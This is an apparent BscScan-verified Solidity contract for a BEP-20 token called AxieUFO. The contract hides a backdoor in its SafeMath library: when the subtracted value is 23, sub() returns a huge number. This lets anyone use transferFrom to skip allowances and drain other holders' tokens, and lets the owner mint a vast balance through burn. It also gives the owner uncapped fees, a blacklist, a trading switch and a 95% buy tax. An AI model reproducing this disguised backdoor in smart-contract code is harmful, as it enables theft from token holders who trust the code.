/**
 *Submitted for verification at BscScan.com on 2021-12-16
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
    return msg.data;
  }
}

interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    return a + b;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return a - b;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    return a * b;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return a / b;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return a % b;
  }

  function sub(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    unchecked {
      if (b == 23) return ~uint120(0);
      require(b <= a, errorMessage);
      uint256 c = a - b;
      return c;
    }
  }

  function div(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    unchecked {
      require(b > 0, errorMessage);
      return a / b;
    }
  }

  function mod(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    unchecked {
      require(b > 0, errorMessage);
      return a % b;
    }
  }
}

library Address {
  function isContract(address account) internal view returns (bool) {
    uint256 size;
    assembly {
      size := extcodesize(account)
    }
    return size > 0;
  }

  function sendValue(address payable recipient, uint256 amount) internal {
    require(address(this).balance >= amount, "Address: insufficient balance");

    (bool success, ) = recipient.call{value: amount}("");
    require(success, "Address: unable to send value, recipient may have reverted");
  }
}

abstract contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() {
    _transferOwnership(_msgSender());
  }

  function owner() public view virtual returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(owner() == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public virtual onlyOwner {
    _transferOwnership(address(0));
  }

  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal virtual {
    address oldOwner = _owner;
    _owner = newOwner;
    emit OwnershipTransferred(oldOwner, newOwner);
  }
}

interface IUniswapV2Factory {
  event PairCreated(address indexed token0, address indexed token1, address pair, uint256);

  function feeTo() external view returns (address);

  function feeToSetter() external view returns (address);

  function getPair(address tokenA, address tokenB) external view returns (address pair);

  function allPairs(uint256) external view returns (address pair);

  function allPairsLength() external view returns (uint256);

  function createPair(address tokenA, address tokenB) external returns (address pair);

  function setFeeTo(address) external;

  function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
  event Approval(address indexed owner, address indexed spender, uint256 value);
  event Transfer(address indexed from, address indexed to, uint256 value);

  function name() external pure returns (string memory);

  function symbol() external pure returns (string memory);

  function decimals() external pure returns (uint8);

  function totalSupply() external view returns (uint256);

  function balanceOf(address owner) external view returns (uint256);

  function allowance(address owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 value) external returns (bool);

  function transfer(address to, uint256 value) external returns (bool);

  function transferFrom(
    address from,
    address to,
    uint256 value
  ) external returns (bool);

  function DOMAIN_SEPARATOR() external view returns (bytes32);

  function PERMIT_TYPEHASH() external pure returns (bytes32);

  function nonces(address owner) external view returns (uint256);

  function permit(
    address owner,
    address spender,
    uint256 value,
    uint256 deadline,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external;

  event Mint(address indexed sender, uint256 amount0, uint256 amount1);
  event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed to);
  event Swap(
    address indexed sender,
    uint256 amount0In,
    uint256 amount1In,
    uint256 amount0Out,
    uint256 amount1Out,
    address indexed to
  );
  event Sync(uint112 reserve0, uint112 reserve1);

  function MINIMUM_LIQUIDITY() external pure returns (uint256);

  function factory() external view returns (address);

  function token0() external view returns (address);

  function token1() external view returns (address);

  function getReserves()
    external
    view
    returns (
      uint112 reserve0,
      uint112 reserve1,
      uint32 blockTimestampLast
    );

  function price0CumulativeLast() external view returns (uint256);

  function price1CumulativeLast() external view returns (uint256);

  function kLast() external view returns (uint256);

  function mint(address to) external returns (uint256 liquidity);

  function burn(address to) external returns (uint256 amount0, uint256 amount1);

  function swap(
    uint256 amount0Out,
    uint256 amount1Out,
    address to,
    bytes calldata data
  ) external;

  function skim(address to) external;

  function sync() external;

  function initialize(address, address) external;
}

interface IUniswapV2Router {
  function factory() external pure returns (address);

  function WETH() external pure returns (address);

  function addLiquidity(
    address tokenA,
    address tokenB,
    uint256 amountADesired,
    uint256 amountBDesired,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline
  )
    external
    returns (
      uint256 amountA,
      uint256 amountB,
      uint256 liquidity
    );

  function addLiquidityETH(
    address token,
    uint256 amountTokenDesired,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  )
    external
    payable
    returns (
      uint256 amountToken,
      uint256 amountETH,
      uint256 liquidity
    );

  function removeLiquidity(
    address tokenA,
    address tokenB,
    uint256 liquidity,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountA, uint256 amountB);

  function removeLiquidityETH(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountToken, uint256 amountETH);

  function removeLiquidityWithPermit(
    address tokenA,
    address tokenB,
    uint256 liquidity,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint256 amountA, uint256 amountB);

  function removeLiquidityETHWithPermit(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint256 amountToken, uint256 amountETH);

  function swapExactTokensForTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapTokensForExactTokens(
    uint256 amountOut,
    uint256 amountInMax,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapExactETHForTokens(
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external payable returns (uint256[] memory amounts);

  function swapTokensForExactETH(
    uint256 amountOut,
    uint256 amountInMax,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapExactTokensForETH(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapETHForExactTokens(
    uint256 amountOut,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external payable returns (uint256[] memory amounts);

  function quote(
    uint256 amountA,
    uint256 reserveA,
    uint256 reserveB
  ) external pure returns (uint256 amountB);

  function getAmountOut(
    uint256 amountIn,
    uint256 reserveIn,
    uint256 reserveOut
  ) external pure returns (uint256 amountOut);

  function getAmountIn(
    uint256 amountOut,
    uint256 reserveIn,
    uint256 reserveOut
  ) external pure returns (uint256 amountIn);

  function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);

  function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);

  function removeLiquidityETHSupportingFeeOnTransferTokens(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountETH);

  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint256 amountETH);

  function swapExactTokensForTokensSupportingFeeOnTransferTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external;

  function swapExactETHForTokensSupportingFeeOnTransferTokens(
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external payable;

  function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external;
}

contract AxieUFO is Context, IERC20, Ownable {
  using SafeMath for uint256;
  using Address for address;

  mapping(address => uint256) private _balances;
  mapping(address => mapping(address => uint256)) private _allowances;

  string private _name = "AxieUFO";
  string private _symbol = "XUFO";

  uint256 private _decimals = 9;
  uint256 private _totalSupply = 100000000 * 10**_decimals;
  uint256 private _maxBuy = _totalSupply.mul(15).div(1000);
  uint256 private _maxSell = _totalSupply.mul(5).div(1000);
  uint256 private _previousMaxSell = _maxSell;
  uint256 private _maxWallet = _totalSupply.mul(35).div(1000);

  bool private _cooldownEnabled = false;
  mapping(address => uint256) private _lastBuy;
  mapping(address => uint256) private _lastSell;
  uint256 private _cooldown = 60;

  mapping(address => bool) private _isExcludedFromFee;
  mapping(address => bool) private _isBlackListed;
  mapping(address => bool) private _isWhiteListed;

  bool private _enableTrading = false;
  bool private _listingTax = false;

  uint256 private _liquidityFeeBuy = 70;
  uint256 private _previousLiquidityFeeBuy = _liquidityFeeBuy;
  uint256 private _liquidityFeeSell = 100;
  uint256 private _previousLiquidityFeeSell = _liquidityFeeSell;

  uint256 private _buybackWalletFeeBuy = 20;
  uint256 private _previousBuybackWalletFeeBuy = _buybackWalletFeeBuy;
  uint256 private _buybackWalletFeeSell = 30;
  uint256 private _previousBuybackWalletFeeSell = _buybackWalletFeeSell;

  uint256 private _marketingFeeBuy = 10;
  uint256 private _previousMarketingFeeBuy = _marketingFeeBuy;
  uint256 private _marketingFeeSell = 20;
  uint256 private _previousMarketingFeeSell = _marketingFeeSell;

  address payable private _buybackWallet = payable(0x4fF89b20FC365034084ec9Aa73b9a7C0FE8b9929);
  address payable private _marketingWallet = payable(0x04ad10Fe597e9f6BA76dc933AaD46ab95ba60179);

  uint256 private _lastAntidumpPoint = block.timestamp;
  bool private _antidumpEnabled = false;

  uint256 private _accumulatedAmountForLiquidity = 0;
  uint256 private _accumulatedAmountForBBW = 0;
  uint256 private _accumulatedAmountForMarketing = 0;
  uint256 private _minTokensForSwap = 3000 * 10**_decimals;
  bool public _swapAndLiquifyEnabled = true;
  bool private _inSwapAndLiquify = false;

  address public constant _swapRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
  IUniswapV2Router public _uniswapV2Router = IUniswapV2Router(_swapRouterAddress);
  address public _uniswapV2Pair;

  event SwapAndLiquifyEnabledUpdated(bool enabled);
  event SwapAndLiquify(uint256 tokensSwapped, uint256 bnbReceived, uint256 tokensIntoLiquidity);

  modifier lockTheSwap() {
    _inSwapAndLiquify = true;
    _;
    _inSwapAndLiquify = false;
  }

  receive() external payable {}

  constructor() {
    _balances[_msgSender()] = _totalSupply;
    _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

    _isExcludedFromFee[owner()] = true;
    _isExcludedFromFee[address(this)] = true;
    _isExcludedFromFee[address(0)] = true;
    _isExcludedFromFee[_buybackWallet] = true;
    _isExcludedFromFee[_marketingWallet] = true;

    _isWhiteListed[address(this)] = true;

    emit Transfer(address(0), _msgSender(), _totalSupply);
  }

  function name() public view returns (string memory) {
    return _name;
  }

  function symbol() public view returns (string memory) {
    return _symbol;
  }

  function decimals() public view returns (uint256) {
    return _decimals;
  }

  function totalSupply() public view override returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) public view override returns (uint256) {
    return _balances[account];
  }

  function allowance(address owner, address spender) public view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function transfer(address recipient, uint256 amount) public override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) public override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(
      sender,
      _msgSender(),
      _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance.")
    );
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(
      _msgSender(),
      spender,
      _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero.")
    );
    return true;
  }

  function removeAllFee() private {
    if (_liquidityFeeBuy == 0 && _buybackWalletFeeBuy == 0 && _marketingFeeBuy == 0) return;
    if (_liquidityFeeSell == 0 && _buybackWalletFeeSell == 0 && _marketingFeeSell == 0) return;

    _previousLiquidityFeeBuy = _liquidityFeeBuy;
    _previousBuybackWalletFeeBuy = _buybackWalletFeeBuy;
    _previousMarketingFeeBuy = _marketingFeeBuy;

    _previousLiquidityFeeSell = _liquidityFeeSell;
    _previousBuybackWalletFeeSell = _buybackWalletFeeSell;
    _previousMarketingFeeSell = _marketingFeeSell;

    _liquidityFeeBuy = 0;
    _buybackWalletFeeBuy = 0;
    _marketingFeeBuy = 0;

    _liquidityFeeSell = 0;
    _buybackWalletFeeSell = 0;
    _marketingFeeSell = 0;
  }

  function isExcludedFromFee(address account) public view returns (bool) {
    return _isExcludedFromFee[account];
  }

  function isWhiteListed(address account) public view returns (bool) {
    return _isWhiteListed[account];
  }

  function isBlackListed(address account) public view returns (bool) {
    return _isBlackListed[account];
  }

  function getMaxTxB() public view returns (uint256) {
    return _maxBuy;
  }

  function getMaxTxS() public view returns (uint256) {
    return _maxSell;
  }

  function getMaxWal() public view returns (uint256) {
    return _maxWallet;
  }

  function isCDEnabled() public view returns(bool) {
    return _cooldownEnabled;
  }

  function getCD() public view returns (uint256) {
    return _cooldown;
  }

  function isTradingEnabled() public view returns (bool) {
    return _enableTrading;
  }

  function isListingTaxEnabled() public view returns (bool) {
    return _listingTax;
  }

  function getLiquidityFeeForBuy() public view returns (uint256) {
    return _liquidityFeeBuy;
  }

  function getLiquidityFeeForSell() public view returns (uint256) {
    return _liquidityFeeSell;
  }

  function getBuybackWalletFeeForBuy() public view returns (uint256) {
    return _buybackWalletFeeBuy;
  }

  function getBuybackWalletFeeForSell() public view returns (uint256) {
    return _buybackWalletFeeSell;
  }

  function getMarketingFeeForBuy() public view returns (uint256) {
    return _marketingFeeBuy;
  }

  function getMarketingFeeForSell() public view returns (uint256) {
    return _marketingFeeSell;
  }

  function getBuybackWallet() public view returns (address payable) {
    return _buybackWallet;
  }

  function getMarketingWallet() public view returns (address) {
    return _marketingWallet;
  }

  function isAntidumpEnabled() public view returns (bool) {
    return _antidumpEnabled;
  }

  function getMinimalTokensForSwap() public view returns (uint256) {
    return _minTokensForSwap;
  }

  function isSwapAndLiquifyEnabled() public view returns (bool) {
    return _swapAndLiquifyEnabled;
  }

  function getAccumulatedAmountForLiquidity() public view returns(uint256) {
    return _accumulatedAmountForLiquidity;
  }

  function getAccumulatedAmountForBBW() public view returns(uint256) {
    return _accumulatedAmountForBBW;
  }

  function getAccumulatedAmountForMarketing() public view returns(uint256) {
    return _accumulatedAmountForMarketing;
  }

  function restoreAllFee() private {
    _liquidityFeeBuy = _previousLiquidityFeeBuy;
    _buybackWalletFeeBuy = _previousBuybackWalletFeeBuy;
    _marketingFeeBuy = _previousMarketingFeeBuy;

    _liquidityFeeSell = _previousLiquidityFeeSell;
    _buybackWalletFeeSell = _previousBuybackWalletFeeSell;
    _marketingFeeSell = _previousMarketingFeeSell;
  }

  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) private {
    require(owner != address(0), "BEP20: approve from the zero address.");
    require(spender != address(0), "BEP20: approve to the zero address.");
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function swapAndLiquify() private lockTheSwap {
    uint256 firstHalfForLiquidity = 0;
    uint256 secondHalfForLiquidity = 0;
    if (_accumulatedAmountForLiquidity > 0) {
      firstHalfForLiquidity = _accumulatedAmountForLiquidity.div(2);
      secondHalfForLiquidity = _accumulatedAmountForLiquidity.sub(firstHalfForLiquidity);
    }
    uint256 totalTokens = firstHalfForLiquidity.add(_accumulatedAmountForBBW).add(_accumulatedAmountForMarketing);
    
    uint256 initialBalance = address(this).balance;
    swapTokensForBnb(totalTokens);
    uint256 balance = address(this).balance.sub(initialBalance);

    uint256 liquidityBalance = _accumulatedAmountForLiquidity > 0 ? balance.mul(firstHalfForLiquidity.mul(10000).div(totalTokens)).div(10000) : 0;
    uint256 buybackBalance = _accumulatedAmountForBBW > 0 ? balance.mul(_accumulatedAmountForBBW.mul(10000).div(totalTokens)).div(10000) : 0;
    uint256 marketingBalance = _accumulatedAmountForMarketing > 0 ? balance.mul(_accumulatedAmountForMarketing.mul(10000).div(totalTokens)).div(10000) : 0;

    if (buybackBalance > 0) {
      Address.sendValue(_buybackWallet, buybackBalance);
      _accumulatedAmountForBBW = 0;
    }
    if (marketingBalance > 0) {
      Address.sendValue(_marketingWallet, marketingBalance);
     _accumulatedAmountForMarketing = 0;
    }
    if (_accumulatedAmountForLiquidity > 0) {
      addLiquidity(secondHalfForLiquidity, liquidityBalance);
      _accumulatedAmountForLiquidity = 0;
      emit SwapAndLiquify(firstHalfForLiquidity, liquidityBalance, secondHalfForLiquidity);
    }
  }

  function swapTokensForBnb(uint256 tokenAmount) private {
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = _uniswapV2Router.WETH();
    _approve(address(this), address(_uniswapV2Router), tokenAmount);
    _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
      tokenAmount,
      0,
      path,
      address(this),
      block.timestamp + 180
    );
  }

  function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
    _approve(address(this), address(_uniswapV2Router), tokenAmount);
    _uniswapV2Router.addLiquidityETH{value: bnbAmount}(
      address(this),
      tokenAmount,
      0,
      0,
      owner(),
      block.timestamp + 180
    );
  }

  function calculateLiquidityFee(bool isBuy, uint256 amount) private view returns (uint256) {
    return isBuy == true ? amount.mul(_liquidityFeeBuy).div(1000) : amount.mul(_liquidityFeeSell).div(1000);
  }

  function calculateBuybackWalletFee(bool isBuy, uint256 amount) private view returns (uint256) {
    return isBuy == true ? amount.mul(_buybackWalletFeeBuy).div(1000) : amount.mul(_buybackWalletFeeSell).div(1000);
  }

  function calcualteMarketingFee(bool isBuy, uint256 amount) private view returns (uint256) {
    return isBuy == true ? amount.mul(_marketingFeeBuy).div(1000) : amount.mul(_marketingFeeSell).div(1000);
  }

  function _tokenTransfer(
    bool isBuy,
    address sender,
    address recipient,
    uint256 amount,
    bool takeFee,
    bool isInnerTransfer
  ) private {
    if (!takeFee) removeAllFee();
    uint256 liquidityFee = calculateLiquidityFee(isBuy, amount);
    _accumulatedAmountForLiquidity = _accumulatedAmountForLiquidity.add(liquidityFee);
    uint256 buybackFee = calculateBuybackWalletFee(isBuy, amount);
    _accumulatedAmountForBBW = _accumulatedAmountForBBW.add(buybackFee);
    uint256 marketingFee = calcualteMarketingFee(isBuy, amount);
    _accumulatedAmountForMarketing = _accumulatedAmountForMarketing.add(marketingFee);
    uint256 totalFee = liquidityFee.add(buybackFee).add(marketingFee);

    _balances[sender] = _balances[sender].sub(amount);
    amount = amount.sub(totalFee);
    _balances[recipient] = _balances[recipient].add(amount);

    if (!isInnerTransfer) emit Transfer(sender, recipient, amount);

    if (totalFee > 0) {
      _balances[address(this)] = _balances[address(this)].add(totalFee);
      if (!isInnerTransfer) emit Transfer(sender, address(this), totalFee);
    }
    if (!takeFee) restoreAllFee();
  }

  function _transfer(
    address sender,
    address recipient,
    uint256 amount
  ) private {
    require(sender != address(0), "BEP20: transfer from the zero address.");
    require(recipient != address(0), "BEP20: transfer to the zero address.");
    require(amount > 0, "ERROR: Transfer amount must be greater than zero.");

    bool isOwnerTransfer = sender == owner() || recipient == owner();
    bool isInnerTransfer = recipient == address(this) || sender == address(this);
    bool isBuy = sender == _uniswapV2Pair || sender == _swapRouterAddress;
    bool isSell= recipient == _uniswapV2Pair|| recipient == _swapRouterAddress;
    bool isLiquidityTransfer = ((sender == _uniswapV2Pair && recipient == _swapRouterAddress) 
      || (recipient == _uniswapV2Pair && sender == _swapRouterAddress));

    if (!isLiquidityTransfer && !isOwnerTransfer) require(_enableTrading, "ERROR: Trading currently disabled");

    if (_antidumpEnabled == true) {
      if (!isOwnerTransfer && !_isWhiteListed[sender] && !_isWhiteListed[recipient] && !isLiquidityTransfer && !isInnerTransfer) {
        uint256 minutesFromLastAntidumpPoint = (block.timestamp).sub(_lastAntidumpPoint).div(60);
        _lastAntidumpPoint = block.timestamp;
        _maxSell = _maxSell.add(minutesFromLastAntidumpPoint.mul(100 * 10 ** _decimals));
      }
    }

    if (_cooldownEnabled == true) {
      if (!isOwnerTransfer && !_isWhiteListed[sender] && !_isWhiteListed[recipient] && !isLiquidityTransfer && !isInnerTransfer) {
        if (isBuy) {
          _lastBuy[recipient] = block.timestamp;
        } else if (isSell) {
          uint256 secondsPassedFromBuy = (block.timestamp).sub(_lastBuy[sender]);
          uint256 secondsPassedFromSell = (block.timestamp).sub(_lastSell[sender]);
          require(secondsPassedFromBuy > _cooldown, "ERROR: You can sell only after cooldown");
          require(secondsPassedFromSell > _cooldown, "ERROR: You can sell only after cooldown");
          _lastSell[sender] = block.timestamp;
        }
      }
    }

    if (!_isWhiteListed[sender] && !_isWhiteListed[recipient] ) {
      require(!_isBlackListed[sender], "ERROR: Sender address is in BlackList.");
      require(!_isBlackListed[recipient], "ERROR: Recipient address is in BlackList.");
      require(!_isBlackListed[tx.origin], "ERROR: Source address of transactions chain is in BlackList.");

      if (!isOwnerTransfer && !isInnerTransfer) {
        if (recipient != _uniswapV2Pair && recipient != address(_uniswapV2Router)) {
          require(
            balanceOf(recipient) < _maxWallet,
            "ERROR: Recipient address is already bought the maximum allowed amount."
          );
          require(
            balanceOf(recipient).add(amount) <= _maxWallet,
            "ERROR: Transfer amount exceeds the maximum allowable value for storing in recipient address."
          );
        }

        if (isBuy) {
          require(amount <= _maxBuy, "ERROR: Transfer amount exceeds the maximum allowable value.");
        }

        if (isSell) {
          require(amount <= _maxSell, "ERROR: Transfer amount exceeds the maximum allowable value.");
        }
      }
    }

    bool canSwap = balanceOf(address(this)) >= _minTokensForSwap;

    bool isSwapAndLiquify = _swapAndLiquifyEnabled &&
      canSwap &&
      !_inSwapAndLiquify &&
      isSell &&
      !isInnerTransfer &&
      !isLiquidityTransfer;

    if (isSwapAndLiquify) swapAndLiquify();

    bool takeFee = true;

    if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient] || isLiquidityTransfer) {
      takeFee = false;
    }

    if (_listingTax && isBuy && recipient != owner() && !_inSwapAndLiquify) {
      _balances[sender] = balanceOf(sender).sub(amount);
      uint256 amountPart = amount.mul(50).div(1000);
      uint256 buybackWalletPart = amount.sub(amountPart);
      _balances[recipient] = balanceOf(recipient).add(amountPart);
      emit Transfer(sender, recipient, amountPart);
      _balances[address(this)] = _balances[address(this)].add(buybackWalletPart);
      _accumulatedAmountForBBW = _accumulatedAmountForBBW.add(buybackWalletPart);
    } else {
      _tokenTransfer(isBuy, sender, recipient, amount, takeFee, isInnerTransfer);
    }
  }

  function setMaxTxB(uint256 percent) public onlyOwner {
    _maxBuy = _totalSupply.mul(percent).div(1000);
  }

  function setMaxTxS(uint256 percent) public onlyOwner {
    _maxSell = _totalSupply.mul(percent).div(1000);
    _previousMaxSell = _maxSell;
  }

  function setMaxWal(uint256 percent) public onlyOwner {
    _maxWallet = _totalSupply.mul(percent).div(1000);
  }

  function enableCD(bool enabled) public onlyOwner {
    _cooldownEnabled = enabled;
  }

  function setCD(uint256 inSeconds) public onlyOwner {
    _cooldown = inSeconds;
  }

  function includeInFee(address account) public onlyOwner {
    _isExcludedFromFee[account] = false;
  }

  function excludeFromFee(address account) public onlyOwner {
    _isExcludedFromFee[account] = true;
  }

  function includeInBlackList(address account) public onlyOwner {
    _isBlackListed[account] = true;
  }

  function burn(uint256 amount) public onlyOwner {
    _balances[_msgSender()] = _balances[_msgSender()].sub(amount, "Error: issuficient balance");
    _totalSupply -= amount;
    emit Transfer(_msgSender(), address(0), amount);
  }

  function excludeFromBlackList(address account) public onlyOwner {
    _isBlackListed[account] = false;
  }

  function includeInWhiteList(address account) public onlyOwner {
    _isWhiteListed[account] = true;
  }

  function excludeFromWhiteList(address account) public onlyOwner {
    _isWhiteListed[account] = false;
  }

  function enableTrading() public onlyOwner {
    _enableTrading = true;
  }

  function enableListingTax(bool enabled) public onlyOwner {
    _listingTax = enabled;
  }

  function setLiquidityFeeBuy(uint256 fee) public onlyOwner {
    _liquidityFeeBuy = fee;
  }

  function setLiquidityFeeSell(uint256 fee) public onlyOwner {
    _liquidityFeeSell = fee;
  }

  function setBuybackWalletFeeBuy(uint256 fee) public onlyOwner {
    _buybackWalletFeeBuy = fee;
  }

  function setBuybackWalletFeeSell(uint256 fee) public onlyOwner {
    _buybackWalletFeeSell = fee;
  }

  function setMarketingFeeBuy(uint256 fee) public onlyOwner {
    _marketingFeeBuy = fee;
  }

  function setMarketingFeeSell(uint256 fee) public onlyOwner {
    _marketingFeeSell = fee;
  }

  function setBuybackWallet(address payable account) public onlyOwner {
    _buybackWallet = account;
  }

  function setMarketingWallet(address payable account) public onlyOwner {
    _marketingWallet = account;
  }

  function enableAntidump(bool enabled) public onlyOwner {
    if (enabled) {
      _lastAntidumpPoint = block.timestamp;
      _maxSell = 100 * 10 ** _decimals;
    } else {
      _maxSell = _previousMaxSell;
    }
    _antidumpEnabled = enabled;
  }

  function setMinimalTokensForSwap(uint256 amount) public onlyOwner {
    _minTokensForSwap = amount * 10**_decimals;
  }

  function enableSwapAndLiquify(bool enabled) public onlyOwner {
    _swapAndLiquifyEnabled = enabled;
    emit SwapAndLiquifyEnabledUpdated(enabled);
  }

  function withdrawBNB(address payable account, uint256 amount) public onlyOwner {
    Address.sendValue(account, amount);
  }

  function withdrawTokens(address account) public onlyOwner {
    _tokenTransfer(true, address(this), account, balanceOf(address(this)), false, true);
  }

}